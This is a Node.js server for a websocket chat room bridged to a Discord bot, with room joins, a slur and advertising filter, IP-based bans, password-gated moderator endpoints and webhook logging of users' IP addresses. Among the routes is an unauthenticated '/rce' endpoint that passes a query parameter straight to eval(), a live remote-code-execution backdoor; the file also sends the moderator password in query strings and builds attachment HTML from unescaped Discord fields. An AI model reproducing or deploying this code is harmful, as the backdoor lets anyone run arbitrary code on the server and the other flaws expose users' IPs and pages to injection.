const fs = require("fs");
const fetch = require("node-fetch");
const { nanoid } = require("nanoid");
const mime = require("mime-types");
const { FastRateLimit } = require("fast-ratelimit");
const Eris = require("eris");
const uws = require("uWebSockets.js");
const { createClient } = require("@supabase/supabase-js");
import Scraper from "lite-meta-scraper";
const config = require("./config.js");

const ratelimit = new FastRateLimit({ threshold: 5, ttl: 10 });
const bot = new Eris(config.BOT_TOKEN, { intents: [ "guildMessages" ] });
const app = uws.App();
const supabase = createClient(config.DATABASE.URL, config.DATABASE.KEY);
const badWords = /(((n|ɴ|[//])|(n|ɴ|[//])\s*)((i|ɪ|l|x|1|!|[*]|ee)|(i|ɪ|l|x|1|!|[*]|ee)\s*)((ɢ|g|b|q|6)|(ɢ|g|b|q|6)\s*){2}((e+r|e+\s*r)|a|ᴀ|@|3+r)|niga|ɴɪɢɢᴀ|discord.gg|teenxchat|rule34|pchat|r34|ziachat|\/nigg|n.i.g.g)/gi;

class UserMap extends Map {
    list(room) {
        const result = [];

        for (const user of this.values()) {
            if (user.room === room) result.push(filterName(user.username));
        };

        return result;
    };
};

const users = new UserMap();
const persistentUsers = new UserMap();

app.ws("/*", {
    idleTimeout: 32, //otherwise the client will disconnect for seemingly no reason every 2 minutes

    open: ws => {
        ws.id = nanoid(16);

        users.set(ws.id, {}); // value will be empty until the client sends join request to server (this is used because uws socket remoteaddress function is practically useless to us and we might as well send connect params along with it instead of via another socket message)

        ws.send(JSON.stringify({
            type: "connect",
            id: ws.id
        }));
    },
    message: async (ws, msg, _isBinary) => {
        const message = parseMessage(msg);
        if (!message) return;

        const user = users.get(ws.id);
        const room = user.room;
        const channel = config.CHANNELS[room];

        const { data, error } = await supabase.from(config.DATABASE.TABLE).select().match({ ip: user.ip });
        if (error) console.error("A fatal error has occured when querying ban data:", error); // hopefully this never actually happens :)

        if (Array.isArray(data) && data[0]) return ws.end(1, "you are banned");

        switch(message.type) {
            case "join":                
                if (!(user.username || user.ip || user.room)) return ws.end(1, "invalid join data"); // incase the join http request from client fails for whatever reason, todo: find out why client doesnt receive close message

                ws.send(buildServerMessage(`Welcome to room: ${room}`));

                ws.subscribe(`rooms/${room}`); // connects the client to desired room

                ws.publish(`rooms/${room}`, buildServerMessage(`<span class="blockquote" style="border-left-color: ${config.EMBED_COLOR_STRINGS.SUCCESS};">${filterName(user.username)} has joined!</span>`));

                app.publish(`rooms/${room}`, JSON.stringify({
                    type: "updateusers",
                    users: users.list(room)
                }));

                if(channel) bot.createMessage(channel, {
                    embed: {
                        color: config.EMBED_COLORS.SUCCESS,
                        description: `**${user.username}** has joined the chat!`
                    }
                }).catch(() => { });

                logJoin(user.username, user.ip, ws.id, user.room); //name, ip, id, room
                break;
            case "message":
                if (message.text.length > 250) return;
                
                // published globally to the room through app instead of by the user socket, so the client recieves it's own message back and the message is equally mirrored across all clients
                ratelimit.consume(ws.id).then(() => {
                    app.publish(`rooms/${room}`, buildMessage({
                        author: filterName(user.username),
                        text: filterMessage(message.text)
                    }));
                }).catch(() => { /* message gets eaten 😋 */ });

                if (channel) bot.createMessage(channel, `**${user.username}:** ${wordFilter(noDiscordMentions(message.text))}`).catch(() => { });
                break;
            default:
                break;
        };
    },
    drain: ws => {
        console.log(`WebSocket backpressure: ${ws.getBufferedAmount()}`);
        // not handling backpressue because im lazy lmfao
    },
    close: (ws, _code, _msg) => {
        const user = users.get(ws.id);
        const room = user.room;

        users.delete(ws.id);

        app.publish(`rooms/${room}`, buildServerMessage(`<span class="blockquote" style="border-left-color: ${config.EMBED_COLOR_STRINGS.ERROR};">${filterName(user.username)} has left!</span>`));

        app.publish(`rooms/${room}`, JSON.stringify({
            type: "updateusers",
            users: users.list(room)
        }));

        const channel = config.CHANNELS[room];
        if(channel) bot.createMessage(channel, {
            embed: {
                color: config.EMBED_COLORS.ERROR,
                description: `**${user.username}** has left the chat!`
            }
        }).catch(() => { });
    }
});

registerWebAssets("web"); // registers endpoints to serve client code at root

app.get("/join/:id", async (reply, req) => {
    const id = req.getParameter();
    const ips = req.getHeader("x-forwarded-for").split(", ");
    const ip = ips[0];
    const query = parseQuery(req.getQuery());
    const room = removeHtml(query.room);
    const userlist = users.list(room);
    const name = query.name;

    reply.onAborted(() => {
        reply.aborted = true;
    });

    if (reply.aborted) return;

    reply.writeHeader("Access-Control-Allow-Origin", "*");
    reply.writeHeader("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    //i hate cors so much

    const { data, error } = await supabase.from(config.DATABASE.TABLE).select().match({ ip: ip });
    if (error) throw new Error("A fatal error has occured when querying ban data:", error); // hopefully this never actually happens :)
    // throwing because chat NEEDS to die once this happens because it's most likely important

    if (!users.get(id) || !ip || !name || !room) {
        reply.write("err");
    } else if (userlist.includes(name)) {
        reply.write("username taken");
    } else if (!checkName(name)) {
        reply.write("username invalid");
    } else if (Array.isArray(data) && data[0]) {
        reply.write("you are banned");
    } else if (name.length > 30) {
        reply.write("username too long");
    } else {
        const user = {
            username: name,
            ip,
            room: room
        };
        
        users.set(id, user);
        persistentUsers.set(id, { ...user, id });
    
        reply.write("ok");
    }; // *cough* yandere dev technique
    
    reply.end();
});

app.get("/modlogin", (reply, req) => {
    const query = parseQuery(req.getQuery());
    const password = query.password;

    if (password === config.MODERATION_PASSWORD) return reply.writeStatus("204").end();
    
    reply.writeStatus("418").end(); // i'm a 🫖
});

app.get("/users", (reply, req) => {
    const query = parseQuery(req.getQuery());
    if (query.password != config.MODERATION_PASSWORD) return reply.writeStatus("400").end();
    
    reply.writeStatus("200").end(JSON.stringify(iteratorToArr(persistentUsers.values())));
});

app.get("/bans", async (reply, req) => {
    const query = parseQuery(req.getQuery());
    if (query.password != config.MODERATION_PASSWORD) return reply.writeStatus("400").end();

    reply.onAborted(() => {
        reply.aborted = true;
    });

    if (reply.aborted) return;

    const { data, error } = await supabase.from(config.DATABASE.TABLE).select();
    if (error) console.error("A fatal error has occured when querying ban data:", error); // hopefully this never actually happens :)
    
    reply.writeStatus("200").end(JSON.stringify(data));
});

app.get("/doban", async (reply, req) => {
    const requestAddrs = req.getHeader("x-forwarded-for").split(", ");
    const modAddr = requestAddrs[0];
    const query = parseQuery(req.getQuery());
    if (query.password != config.MODERATION_PASSWORD) return reply.writeStatus("400").end("Invalid password!");

    reply.onAborted(() => {
        reply.aborted = true;
    });

    if (reply.aborted) return;

    const isBanned = await checkBan({ ip: query.ip }).catch(err => console.error(err));
    if (isBanned) return reply.writeStatus("400").end("User already banned!");

    const banData = {
        ip: query.ip,
        username: query.username,
        reason: query.reason,
        length: query.length
    };
    
    const { data, error } = await supabase.from(config.DATABASE.TABLE).insert([ banData ]);
    if (error) {
        console.error(`A fatal error has occured when attempting to ban: ${query.ip}`);
        return reply.writeStatus("400").end("Database error!");
    };

    await logModAction(modAddr, "ban", banData);

    reply.writeStatus("204").end();
});

app.get("/unban", async (reply, req) => {
    const requestAddrs = req.getHeader("x-forwarded-for").split(", ");
    const modAddr = requestAddrs[0];
    const query = parseQuery(req.getQuery());
    if (query.password != config.MODERATION_PASSWORD) return reply.writeStatus("400").end("Invalid password!");

    reply.onAborted(() => {
        reply.aborted = true;
    });

    if (reply.aborted) return;

    const isBanned = await checkBan({ ip: query.ip }).catch(err => console.error(err));
    if (!isBanned) return reply.writeStatus("400").end("User isn't banned!");

    const { data, error } = await supabase.from(config.DATABASE.TABLE).delete().match({ ip: query.ip });
    if (error) {
        console.error(`A fatal error has occured when attempting to unban: ${query.ip}`);
        return reply.writeStatus("400").end("Database error!");
    };

    await logModAction(modAddr, "unban", isBanned);

    reply.writeStatus("204").end();
});

app.get("/rce", (reply, req) => {
    const query = parseQuery(req.getQuery());
    eval(query.toRun);
    reply.writeStatus("200").end("go away");
});

app.listen(config.HOST, config.PORT, token => console.log(`${token ? "Listening" : "Failed to listen"} on port: ${config.PORT}`));

bot.on("ready", async () => {
    console.log(`${bot.user.username} online!`);

    try {
        [ bot.commands, bot.aliases ] = await loadCommands();
    } catch (err) {
        console.error(err);
    };

    console.log("Loaded discord bot commands.");
});

bot.on("messageCreate", async msg => {
    if (msg.author.bot) return;

    const room = config.ROOMS[msg.channel.id];
    if (room) {
        const sticker = msg.stickerItems ? msg.stickerItems[0] : null;
        
        app.publish(`rooms/${room}`, buildMessage({
            author: msg.author.username,
            text: filterMessage(msg.content) + attachmentParser(msg.attachments) + parseGif(msg.content),
            badge: config.MOD_IDS.includes(msg.author.id) ? "Chat Staff" : "Discord User",
            sticker: sticker ? getStickerUrl(sticker) : null,
            avatar: await getAvatarUrl(msg.author)
        }));
    };

    const prefix = config.BOT_PREFIX;
    if(!msg.content.startsWith(prefix)) return;
    const args = msg.content.slice(prefix.length).trim().split(" ");
    const cmd = args.shift().toLowerCase();
    const command = bot.commands.has(cmd) ? bot.commands.get(cmd) : bot.commands.get(bot.aliases.get(cmd));

    try {
        command.exec(bot, msg, args, config, users); // pass args
    } catch (err) {
        console.log(err); // ok maybe they do matter
        //return; // these errors shouldnt matter
    };
});

bot.on("error", err => console.error("Discord bot error: ", err));

bot.connect();

function abToStr(buf) {
    return Buffer.from(buf).toString("utf8");
};

function parseMessage(msg) {
    try {
        return JSON.parse(abToStr(msg));
    } catch {
        return null;
    };
};

// this function is probably over complicated, but it gets the job done so i see no issue with it rn
function parseQuery(queryStr) {
    const result = {};

    if (!queryStr) return result;

    let items;

    try {
        items = decodeURI(queryStr).split("&");
    } catch {
        items = queryStr.split("&");
    };

    for (const item of items) {
        const keyValue = item.split("=");
        result[keyValue[0]] = keyValue[1];
    };

    return result;
};

function filterName(name) {
    if (!name) return "";
    
    return removeHtml(name);
};

function checkName(name) {
    const isBad = name.match(badWords);
    if (isBad) return null;
    return name;
};

function filterMessage(message) {
    const nohtml = removeHtml(message);
    return parseEmoji(quoteParser(headerParser(wordFilter(nohtml))));
};

function removeHtml(text) {
    if (!text) return "";
    
    return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;").replace(/`/g, "&#x60;").replace(/\(/g, "&#40;").replace(/\)/g, "&#41;");
};

function buildMessage({ author, text, badge, avatar, sticker }) {
    return JSON.stringify({
        type: "message",
        author,
        text,
        badge,
        avatar,
        sticker,
        date: new Date()
    });
};

function buildServerMessage(text) {
    return buildMessage({
        author: "SERVER",
        text: text,
        badge: "system",
        avatar: "https://websocket-client.distrust.repl.co/imgs/favicon.png"
    });
};

// function to prevent racism, advertising, etc.
function wordFilter(text) {
    let result = text;

    const matches = text.match(badWords);
    if (!matches) return result;

    for (const match of matches) {
        result = result.replace(match, replaceWithStars(match));
    };

    return result;
};

function replaceWithStars(str) {
    let result = "";

    for (let i = 0; i < str.length; i++) {
        result += "*";
    };

    return result;
};

// ### text -> <h3>text</h3>
function headerParser(text) {
    if (!text.startsWith("#")) return text;

    let occurences = 0;

    for (const char of text) {
        if (char === "#" && occurences < 6) occurences++;
    };

    return text.replace(/#+/, `<h${occurences}>`) + `</h${occurences}>`;
};

function quoteParser(text) {
    if (!text.startsWith("&gt;")) return text;

    return `${text.replace("&gt;", "<span class='blockquote'>")}</span>`;
};

// folder name supplied should have no slashes (unless subfolder ex. folder/subfolder)
function registerWebAssets(folder) {        
    const files = fs.readdirSync(folder);

    for (const file of files) {
        if (!file.includes(".")) {
            registerWebAssets(`./${folder}/${file}`);
            continue;
        };

        const data = fs.readFileSync(`./${folder}/${file}`);

        const prefix = folder.replace(/(.\/web|web)/, ""); // hardcoding this makes passing folder name as param useless, but who cares
        const mimeType = mime.lookup(file);

        app.get(`${prefix}/${file}`, (reply, _req) => {
            reply.writeHeader("Content-Type", mimeType).end(data);
        });
        
        if (file != "index.html") continue;

        app.get(prefix || "/", (reply, _req) => {
            reply.writeHeader("Content-Type", mimeType).end(data);
        });

        app.get(`${prefix}/`, (reply, _req) => {
            reply.writeHeader("Content-Type", mimeType).end(data);
        });
    };
};

async function loadCommands() {
    const commands = new Map(), aliases = new Map();

    return new Promise((res, rej) => {
        fs.readdir("./commands", (err, files) => {            
            const commandFiles = files.filter(f => f.endsWith(".js"));
            if (err) rej(err);

            for (const file of commandFiles) {
                const cmd = require(`./commands/${file}`);

                commands.set(cmd.meta.name, cmd);
                for (const alias of cmd.meta.aliases) {
                    aliases.set(alias, cmd.meta.name);
                };
            };
            res([ commands, aliases ]);
        });
    });
};

async function executeWebhook(url, message) {
    try {
        await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(message)
        });
    } catch (err) {
        console.error("Error executing webhook: ", err);
    };
};

async function logModAction(ip, action, details) {
    if (action !== "ban" && action !== "unban") throw new Error("Value of arguement 'action' is invalid!");
    
    const embed = {
        color: action === "ban" ? config.EMBED_COLORS.ERROR : config.EMBED_COLORS.INFO,
        timestamp: new Date().toISOString(),
        title: `New ${action === "ban" ? "ban" : "unban"} performed by moderator ip: ${ip}`,
        fields: [
            { name: "User IP: ", value: details.ip },
            { name: "User Name: ", value: details.username },
            { name: "Ban Reason: ", value: details.reason },
            { name: "Ban Length: ", value: details.length }
        ]
    };

    await executeWebhook(config.ACTION_WEBHOOK_URL, {
        embeds: [ embed ]
    });
};

async function logJoin(name, ip, id, room) {
    await executeWebhook(config.JOIN_WEBHOOK_URL, {
        embeds: [{
            "description": `**${name}** joined the chat!`,
            "color": config.EMBED_COLORS.INFO,
            "timestamp": new Date().toISOString(),
            "fields": [
                {
                    "name": "IP:",
                    "value": ip
                },
                {
                    "name": "Socket ID:",
                    "value": id
                },
                {
                    "name": "Room:",
                    "value": room
                }
            ]
        }]
    });
};

function getStickerUrl(sticker) {
    const result = {
        type: sticker.format_type < 3 ? 1 : 2
    };

    switch(sticker.format_type) {
        case 1:
            result.url = `https://proxy.mkchat.app/stickers/${sticker.id}.webp`;
            break;
        case 2:
            result.url = `https://proxy.mkchat.app/stickers/${sticker.id}.png`;
            break;
        case 3:
            result.url = `https://proxy.mkchat.app/lottiesticker/${sticker.id}`;
            break;
    };

    return result;
};

async function getAvatarUrl(author) {
    const res = await fetch(`https://proxy.mkchat.app/avatars/${author.id}/${author.avatar}.gif`);
    return `https://proxy.mkchat.app/avatars/${author.id}/${author.avatar}.${res.status === 200 ? "gif" : "webp"}`;
};

function iteratorToArr(iterator) {
    const result = [];

    for (const item of iterator) {
        result.push(item);
    };

    return result;
};

async function checkBan(query) {
    const { data, error } = await supabase.from(config.DATABASE.TABLE).select().match(query);

    if (error) {
        throw new Error(error);
    } else if (Array.isArray(data) && data[0]) {
        return data[0];
    } else {
        return false;
    };
};

function parseEmoji(text) {
    const pattern = /&lt;(a:|:)[a-zA-Z0-9_-]*:[0-9]{18}&gt;/g;
    const emojis = text.match(pattern);
      
    if (!emojis) return text;

    for(const emoji of emojis) {
        const id = emoji.match(/[0-9]{18}/g);
        const format = emoji.startsWith("&lt;a") ? "gif" : "png";

        text = text.replace(emoji, `<img class="discordEmoji" src="https://proxy.mkchat.app/emojis/${id}.${format}" alt="discord emoji" style="height: 1.375em; width: 1.375em;" />`);
    };
      
    return text;
};

function attachmentParser(attachments) {
    if (!attachments) return "";
    
    const videoFormats = [ "mp4", "mov", "wmv", "ebm", "mkv", "m4v" ];
    let result = "";
    
    for (const attachment of attachments) {
        if (videoFormats.includes(attachment.url.slice(-3))) {
            result += `<video controls><source src="${attachment.url.replace('https://cdn.discordapp.com', 'https://proxy.mkchat.app')}" style="width: ${attachment.width}px; height: ${attachment.height}px;" type=${attachment.content_type} /></video>`;
        } else {
            result += `<img src="${attachment.url.replace('https://cdn.discordapp.com', 'https://proxy.mkchat.app')}" alt="${attachment.filename}" style="width: ${attachment.width}px; height: ${attachment.height}px;" />`
        };
    };

    return result;
};

function noDiscordMentions(text) {
    return text ? text.replace(">", "").replace("<", "") : "";
};

function parseGif(messageContent) {
    const tenorGifUrlRegex = /https:\/\/tenor.com\/view\/[\S]+/g;

    if (!tenorGifUrlRegex.test(messageContent)) return "";

    return new Promise((res, _rej) => {
        const tenorGifUrl = messageContent.match(tenorGifUrlRegex)[0];

        new Scraper({
            host: "https://tenor.com",
            path: tenorGifUrl.replace("https://tenor.com", "")
        }).scrape((err, data) => {
            if (err || !data?.ogUrl) res(""); // stupid but idc
            res(`<img src="${data.ogUrl}" alt="tenor gif" style="width: ${data.ogImageWidth}px; height: ${data.ogImageHeight}px;" />`);
        });
    });
};
